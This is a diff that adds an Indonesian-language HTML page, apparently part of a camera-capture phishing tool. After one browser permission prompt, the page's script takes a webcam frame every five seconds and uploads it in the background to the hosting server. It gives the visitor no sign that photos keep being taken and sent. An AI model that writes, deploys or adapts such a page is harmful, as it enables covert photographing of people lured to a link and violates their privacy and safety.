@@ -1,0 +1,38 @@
+<!doctype html>
+<html>
+<head>
+  <title>Ambil Foto</title>
+  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+<body>
+  <div class="video-wrap">
+    <video id="video" playsinline autoplay></video>
+  </div>
+  <canvas id="canvas" width="640" height="480"></canvas>
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+    const uploadUrl = `${window.location.origin}/upload${window.location.pathname}`;
+
+    // Akses webcam
+    async function init() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+      } catch (e) {
+        alert(`Error: ${e.toString()}`);
+      }
+    }
+
+    // Kirim foto ke server setiap 5 detik
+    setInterval(() => {
+      context.drawImage(video, 0, 0, 640, 480);
+      const imgData = canvas.toDataURL('image/png').split(',')[1];
+      $.post(uploadUrl, { imgData: imgData });
+    }, 5000);
+
+    init();
+  </script>
+</body>
+</html>
